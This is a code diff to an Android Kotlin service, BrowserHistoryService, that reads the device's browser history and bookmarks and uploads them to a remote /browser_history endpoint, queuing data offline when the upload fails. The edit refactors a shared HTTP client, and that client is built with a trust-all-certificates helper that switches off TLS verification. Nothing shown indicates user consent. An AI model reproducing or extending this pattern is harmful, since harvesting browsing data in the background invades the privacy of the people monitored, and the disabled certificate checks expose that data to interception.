@@ -32,6 +32,8 @@ class BrowserHistoryService : Service() {
         private val BROWSER_BOOKMARKS_URI = Uri.parse("content://browser/bookmarks")
     }
 
+    private val httpClient = TrustAllCertificates.createClientBuilder().build()
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Thread { collectAndSend() }.start()
         return START_NOT_STICKY
@@ -40,6 +42,8 @@ class BrowserHistoryService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        httpClient.dispatcher.executorService.shutdown()
+        httpClient.connectionPool.evictAll()
         stopForeground(false)
         super.onDestroy()
     }
@@ -133,14 +137,13 @@ class BrowserHistoryService : Service() {
 
     private fun sendToServer(payload: JSONObject) {
         try {
-            val client = TrustAllCertificates.createClientBuilder().build()
             val body = payload.toString().toRequestBody("application/json".toMediaType())
             val request = Request.Builder()
                 .url("${AndroidConfig.apiBaseUrl}/browser_history")
                 .post(body)
                 .build()
 
-            client.newCall(request).execute().use { response ->
+            httpClient.newCall(request).execute().use { response ->
                 if (!response.isSuccessful) {
                     OfflineDataQueue(this).enqueue("browser_history", payload.toString(), AndroidConfig.deviceId)
                 }
